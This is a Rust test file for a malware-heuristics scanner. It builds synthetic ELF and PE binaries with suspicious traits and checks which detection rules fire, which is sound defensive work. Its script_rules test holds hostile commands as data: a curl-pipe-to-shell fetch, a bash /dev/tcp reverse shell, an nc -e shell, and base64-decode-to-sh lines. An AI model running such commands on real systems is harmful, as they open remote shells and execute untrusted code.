//! Heuristics against minimal, hand-built ELF and PE files that have exactly
//! the property each rule looks for (no real malware), plus negative checks
//! on this machine's own binaries.
#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::collections::BTreeSet;
use std::path::Path;
use std::time::{Duration, Instant};

use warden_core::{FindingTarget, ObservedPath};

fn rules(name: &str, path: Option<&Path>, data: &[u8]) -> BTreeSet<String> {
    let target = FindingTarget::File {
        path: ObservedPath::from_path(Path::new(name)),
        sha256: None,
        metadata: None,
    };
    let deadline = Instant::now() + Duration::from_secs(30);
    warden_heuristics::analyze(name, path, data, target, deadline)
        .expect("analyze")
        .into_iter()
        .map(|f| {
            assert_ne!(f.confidence, warden_core::Confidence::Confirmed);
            assert_eq!(f.recommended_action, warden_core::RecommendedAction::Review);
            f.source.rule_id.unwrap()
        })
        .collect()
}

fn set(ids: &[&str]) -> BTreeSet<String> {
    ids.iter().map(|s| (*s).to_owned()).collect()
}

fn p32(v: &mut Vec<u8>, x: u32) {
    v.extend_from_slice(&x.to_le_bytes());
}
fn p64(v: &mut Vec<u8>, x: u64) {
    v.extend_from_slice(&x.to_le_bytes());
}
fn p16(v: &mut Vec<u8>, x: u16) {
    v.extend_from_slice(&x.to_le_bytes());
}

#[derive(Default)]
struct ElfOpts {
    rwx: bool,
    exec_stack: bool,
    interp: Option<&'static str>,
    runpath: Option<&'static str>,
    no_sections: bool,
    upx: bool,
    entry_outside: bool,
}

const BASE: u64 = 0x40_0000;

/// ELF64 shared object with one PT_LOAD covering the whole file.
fn elf(o: &ElfOpts) -> Vec<u8> {
    let nph = 3 + u64::from(o.interp.is_some()) + u64::from(o.runpath.is_some());
    let data_off = 64 + 56 * nph;
    let mut blob = Vec::new();
    if o.upx {
        blob.extend_from_slice(b"\0\0\0\0UPX!\x0d\x16\x08\x0d");
    }
    let interp_off = data_off + blob.len() as u64;
    if let Some(i) = o.interp {
        blob.extend_from_slice(i.as_bytes());
        blob.push(0);
    }
    let strtab_off = data_off + blob.len() as u64;
    let mut strtab = vec![0u8];
    if let Some(r) = o.runpath {
        strtab.extend_from_slice(r.as_bytes());
        strtab.push(0);
    }
    blob.extend_from_slice(&strtab);
    while blob.len() % 8 != 0 {
        blob.push(0);
    }
    let dyn_off = data_off + blob.len() as u64;
    if o.runpath.is_some() {
        for (tag, val) in [
            (5u64, BASE + strtab_off),
            (10, strtab.len() as u64),
            (29, 1),
            (0, 0),
        ] {
            p64(&mut blob, tag);
            p64(&mut blob, val);
        }
    }
    blob.extend_from_slice(&[0x90; 256]); // "code"
    let sh_off = data_off + blob.len() as u64;
    let total = sh_off + if o.no_sections { 0 } else { 64 };

    let mut v = Vec::new();
    v.extend_from_slice(b"\x7fELF\x02\x01\x01\0\0\0\0\0\0\0\0\0");
    p16(&mut v, 3); // ET_DYN
    p16(&mut v, 62); // x86-64
    p32(&mut v, 1);
    p64(
        &mut v,
        if o.entry_outside {
            0x90_0000
        } else {
            BASE + total - 64 - 16
        },
    );
    p64(&mut v, 64); // phoff
    p64(&mut v, if o.no_sections { 0 } else { sh_off });
    p32(&mut v, 0);
    p16(&mut v, 64);
    p16(&mut v, 56);
    p16(&mut v, nph as u16);
    p16(&mut v, 64);
    p16(&mut v, u16::from(!o.no_sections));
    p16(&mut v, 0);
    let ph = |v: &mut Vec<u8>, typ: u32, flags: u32, off: u64, size: u64| {
        p32(v, typ);
        p32(v, flags);
        p64(v, off);
        p64(v, BASE + off);
        p64(v, BASE + off);
        p64(v, size);
        p64(v, size);
        p64(v, 8);
    };
    ph(&mut v, 1, if o.rwx { 7 } else { 5 }, 0, total); // PT_LOAD
    ph(&mut v, 0x6474_e551, if o.exec_stack { 7 } else { 6 }, 0, 0); // PT_GNU_STACK
    ph(&mut v, 4, 4, 0, 0); // PT_NOTE (empty)
    if let Some(i) = o.interp {
        ph(&mut v, 3, 4, interp_off, i.len() as u64 + 1);
    }
    if o.runpath.is_some() {
        ph(&mut v, 2, 6, dyn_off, 64);
    }
    v.extend_from_slice(&blob);
    if !o.no_sections {
        v.extend_from_slice(&[0; 64]);
    }
    assert_eq!(v.len() as u64, total);
    v
}

#[derive(Default)]
struct PeOpts {
    rwx: bool,
    section_name: Option<&'static [u8; 8]>,
    entry_in_data: bool,
    imports: &'static [&'static str],
    random_code: usize,
    efi: bool,
    overlay_pe: bool,
}

fn align(x: u32, a: u32) -> u32 {
    x.div_ceil(a) * a
}

/// PE32+ with a code section and an import section.
fn pe(o: &PeOpts) -> Vec<u8> {
    let code_len = align(o.random_code.max(0x200) as u32, 0x200);
    let text_rva = 0x1000;
    let idata_rva = text_rva + align(code_len, 0x1000);
    let text_raw = 0x400;
    let idata_raw = text_raw + code_len;

    // .idata: descriptor + null, ILT, IAT, hint/names, dll name.
    let n = o.imports.len() as u32;
    let desc_size = 20 * 2;
    let ilt = desc_size;
    let iat = ilt + 8 * (n + 1);
    let names = iat + 8 * (n + 1);
    let mut hint_names = Vec::new();
    let mut name_rvas = Vec::new();
    for f in o.imports {
        name_rvas.push(idata_rva + names + hint_names.len() as u32);
        hint_names.extend_from_slice(&[0, 0]);
        hint_names.extend_from_slice(f.as_bytes());
        hint_names.push(0);
        if hint_names.len() % 2 == 1 {
            hint_names.push(0);
        }
    }
    let dll = names + hint_names.len() as u32;
    let mut idata = Vec::new();
    if n > 0 {
        p32(&mut idata, idata_rva + ilt);
        p32(&mut idata, 0);
        p32(&mut idata, 0);
        p32(&mut idata, idata_rva + dll);
        p32(&mut idata, idata_rva + iat);
    } else {
        idata.extend_from_slice(&[0; 20]);
    }
    idata.extend_from_slice(&[0; 20]);
    for _ in 0..2 {
        for r in &name_rvas {
            p64(&mut idata, u64::from(*r));
        }
        p64(&mut idata, 0);
    }
    idata.extend_from_slice(&hint_names);
    idata.extend_from_slice(b"kernel32.dll\0");
    let idata_len = align(idata.len() as u32, 0x200);
    idata.resize(idata_len as usize, 0);

    let mut code = vec![0xCCu8; code_len as usize];
    if o.random_code > 0 {
        let mut x: u64 = 0x2545_F491_4F6C_DD1D;
        for b in &mut code {
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            *b = (x >> 24) as u8;
        }
    }

    let mut v = vec![0u8; 0x40];
    v[0] = b'M';
    v[1] = b'Z';
    v[0x3c] = 0x40;
    v.extend_from_slice(b"PE\0\0");
    p16(&mut v, 0x8664);
    p16(&mut v, 2);
    p32(&mut v, 0);
    p32(&mut v, 0);
    p32(&mut v, 0);
    p16(&mut v, 240);
    p16(&mut v, 0x22);
    // Optional header (PE32+).
    p16(&mut v, 0x20b);
    v.extend_from_slice(&[14, 0]);
    p32(&mut v, code_len);
    p32(&mut v, idata_len);
    p32(&mut v, 0);
    p32(&mut v, if o.entry_in_data { idata_rva } else { text_rva });
    p32(&mut v, text_rva);
    p64(&mut v, 0x1_4000_0000);
    p32(&mut v, 0x1000);
    p32(&mut v, 0x200);
    for x in [6u16, 0, 0, 0, 6, 0] {
        p16(&mut v, x);
    }
    p32(&mut v, 0);
    p32(&mut v, idata_rva + align(idata_len, 0x1000));
    p32(&mut v, 0x400);
    p32(&mut v, 0);
    p16(&mut v, if o.efi { 10 } else { 3 });
    p16(&mut v, 0x8160);
    for _ in 0..4 {
        p64(&mut v, 0x10_0000);
    }
    p32(&mut v, 0);
    p32(&mut v, 16);
    for i in 0..16 {
        if i == 1 && n > 0 {
            p32(&mut v, idata_rva);
            p32(&mut v, desc_size);
        } else {
            p64(&mut v, 0);
        }
    }
    let sect = |v: &mut Vec<u8>, name: &[u8; 8], rva: u32, size: u32, raw: u32, chars: u32| {
        v.extend_from_slice(name);
        p32(v, size);
        p32(v, rva);
        p32(v, size);
        p32(v, raw);
        p32(v, 0);
        p32(v, 0);
        p16(v, 0);
        p16(v, 0);
        p32(v, chars);
    };
    let text_chars = 0x6000_0020 | if o.rwx { 0x8000_0000 } else { 0 };
    sect(
        &mut v,
        o.section_name.unwrap_or(b".text\0\0\0"),
        text_rva,
        code_len,
        text_raw,
        text_chars,
    );
    sect(
        &mut v,
        b".idata\0\0",
        idata_rva,
        idata_len,
        idata_raw,
        0x4000_0040,
    );
    v.resize(text_raw as usize, 0);
    v.extend_from_slice(&code);
    v.extend_from_slice(&idata);
    if o.overlay_pe {
        v.extend_from_slice(b"overlay:");
        v.extend_from_slice(&pe(&PeOpts::default()));
    }
    v
}

#[test]
fn builders_produce_clean_baselines() {
    assert!(rules("lib.so", None, &elf(&ElfOpts::default())).is_empty());
    assert!(
        rules(
            "app.exe",
            None,
            &pe(&PeOpts {
                imports: &["ExitProcess"],
                ..PeOpts::default()
            })
        )
        .is_empty()
    );
}

#[test]
fn elf_rules() {
    let hit = |o: ElfOpts| rules("prog", None, &elf(&o));
    assert_eq!(
        hit(ElfOpts {
            rwx: true,
            ..ElfOpts::default()
        }),
        set(&["AW-HEU-020"])
    );
    assert_eq!(
        hit(ElfOpts {
            exec_stack: true,
            ..ElfOpts::default()
        }),
        set(&["AW-HEU-021"])
    );
    assert_eq!(
        hit(ElfOpts {
            upx: true,
            ..ElfOpts::default()
        }),
        set(&["AW-HEU-022"])
    );
    assert_eq!(
        hit(ElfOpts {
            no_sections: true,
            ..ElfOpts::default()
        }),
        set(&["AW-HEU-023"])
    );
    assert_eq!(
        hit(ElfOpts {
            runpath: Some("/opt/x/lib:/tmp/evil"),
            ..ElfOpts::default()
        }),
        set(&["AW-HEU-024"])
    );
    assert_eq!(
        hit(ElfOpts {
            runpath: Some("$ORIGIN/../lib:/usr/lib"),
            ..ElfOpts::default()
        }),
        set(&[])
    );
    assert_eq!(
        hit(ElfOpts {
            runpath: Some("lib"),
            ..ElfOpts::default()
        }),
        set(&["AW-HEU-024"])
    );
    assert_eq!(
        hit(ElfOpts {
            entry_outside: true,
            ..ElfOpts::default()
        }),
        set(&["AW-HEU-025"])
    );
    assert_eq!(
        hit(ElfOpts {
            interp: Some("/tmp/ld-linux-x86-64.so.2"),
            ..ElfOpts::default()
        }),
        set(&["AW-HEU-026"])
    );
    assert_eq!(
        hit(ElfOpts {
            interp: Some("/lib64/ld-linux-x86-64.so.2"),
            ..ElfOpts::default()
        }),
        set(&[])
    );
    assert_eq!(
        hit(ElfOpts {
            rwx: true,
            exec_stack: true,
            upx: true,
            no_sections: true,
            ..ElfOpts::default()
        }),
        set(&[
            "AW-HEU-020",
            "AW-HEU-021",
            "AW-HEU-022",
            "AW-HEU-023",
            "AW-HEU-099"
        ])
    );
}

#[test]
fn pe_rules() {
    let hit = |o: PeOpts| rules("app.exe", None, &pe(&o));
    let base = || PeOpts {
        imports: &["ExitProcess"],
        ..PeOpts::default()
    };
    assert_eq!(
        hit(PeOpts {
            rwx: true,
            ..base()
        }),
        set(&["AW-HEU-010"])
    );
    assert_eq!(
        hit(PeOpts {
            entry_in_data: true,
            ..base()
        }),
        set(&["AW-HEU-011"])
    );
    assert_eq!(
        hit(PeOpts {
            section_name: Some(b"UPX1\0\0\0\0"),
            ..base()
        }),
        set(&["AW-HEU-012"])
    );
    assert_eq!(
        hit(PeOpts {
            random_code: 0x4000,
            ..base()
        }),
        set(&["AW-HEU-013"])
    );
    // UEFI images carry compressed payloads by design.
    assert_eq!(
        hit(PeOpts {
            random_code: 0x4000,
            efi: true,
            ..base()
        }),
        set(&[])
    );
    assert_eq!(
        hit(PeOpts {
            imports: &[
                "OpenProcess",
                "VirtualAllocEx",
                "WriteProcessMemory",
                "CreateRemoteThread"
            ],
            ..PeOpts::default()
        }),
        set(&["AW-HEU-014"])
    );
    assert_eq!(
        hit(PeOpts {
            imports: &["VirtualAllocEx", "WriteProcessMemory"],
            ..PeOpts::default()
        }),
        set(&[])
    );
    assert_eq!(
        hit(PeOpts {
            overlay_pe: true,
            ..base()
        }),
        set(&["AW-HEU-015"])
    );
    let mut broken = pe(&base());
    broken.truncate(0x150);
    assert!(rules("app.exe", None, &broken).contains("AW-HEU-016"));
}

#[test]
fn name_and_location_rules() {
    let exe = elf(&ElfOpts::default());
    assert_eq!(rules("invoice.pdf", None, &exe), set(&["AW-HEU-001"]));
    assert_eq!(
        rules("invoice.pdf.exe", None, b"text"),
        set(&["AW-HEU-002"])
    );
    assert_eq!(
        rules("inv\u{202E}fdp.exe", None, b"text"),
        set(&["AW-HEU-003"])
    );
    assert_eq!(
        rules("x", Some(Path::new("/dev/shm/x")), &exe),
        set(&["AW-HEU-040"])
    );
    assert_eq!(rules("x", Some(Path::new("/tmp/notes")), b"text"), set(&[]));
    let disguised = pe(&PeOpts {
        imports: &["ExitProcess"],
        ..PeOpts::default()
    });
    assert_eq!(
        rules("photo.jpg.exe", None, &disguised),
        set(&["AW-HEU-002"])
    );
    assert_eq!(rules("photo.jpg", None, &disguised), set(&["AW-HEU-001"]));
}

#[test]
fn script_rules() {
    let r = |name: &str, text: &str| rules(name, None, text.as_bytes());
    assert_eq!(
        r("i.sh", "#!/bin/sh\ncurl -fsSL http://x.example/a | sh\n"),
        set(&["AW-HEU-030"])
    );
    assert_eq!(
        r("r", "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"),
        set(&["AW-HEU-031"])
    );
    assert_eq!(
        r(
            "e.py",
            "import os\nos.system('echo aGk= | base64 -d | sh')\n"
        ),
        set(&["AW-HEU-032"])
    );
    assert_eq!(
        r("m.bat", "mshta vbscript:Execute(\"x\")\r\n"),
        set(&["AW-HEU-033"])
    );
    assert_eq!(
        r("p.sh", "#!/bin/sh\nLD_PRELOAD=/x.so ls\n"),
        set(&["AW-HEU-034"])
    );
    let blob = format!("$d = '{}'\n", "QUJD".repeat(1100));
    assert_eq!(r("b.ps1", &blob), set(&["AW-HEU-035"]));
    assert_eq!(
        r(
            "all.sh",
            "#!/bin/sh\ncurl x|sh\nnc -e /bin/sh 1.2.3.4 1 \necho x|base64 -d|sh\n"
        ),
        set(&["AW-HEU-030", "AW-HEU-031", "AW-HEU-032", "AW-HEU-099"])
    );
    // Comments and non-scripts are not searched.
    assert_eq!(r("c.sh", "#!/bin/sh\n# curl x | sh\n"), set(&[]));
    assert_eq!(r("notes.txt", "curl x | sh\n"), set(&[]));
}

#[test]
fn this_machines_programs_are_clean() {
    // Read-only negative check on real binaries, where present.
    for p in [
        "/usr/bin/ls",
        "/bin/ls",
        "/usr/bin/bash",
        "/bin/sh",
        "/usr/lib64/libc.so.6",
        "/lib/x86_64-linux-gnu/libc.so.6",
    ] {
        if let Ok(data) = std::fs::read(p) {
            let name = Path::new(p)
                .file_name()
                .unwrap()
                .to_string_lossy()
                .into_owned();
            assert!(rules(&name, Some(Path::new(p)), &data).is_empty(), "{p}");
        }
    }
    let own = std::fs::read(std::env::current_exe().unwrap()).unwrap();
    assert!(rules("synthetic", None, &own).is_empty());
}

#[test]
fn arbitrary_bytes_do_not_panic() {
    let mut x: u32 = 1;
    for len in [0usize, 1, 4, 64, 65, 300, 5000] {
        let mut v: Vec<u8> = (0..len)
            .map(|_| {
                x = x.wrapping_mul(1_103_515_245).wrapping_add(12_345);
                (x >> 16) as u8
            })
            .collect();
        if len >= 4 {
            v[..4].copy_from_slice(b"\x7fELF");
        }
        let _ = rules("x", None, &v);
        if len >= 2 {
            v[..2].copy_from_slice(b"MZ");
        }
        let _ = rules("x.exe", None, &v);
    }
}
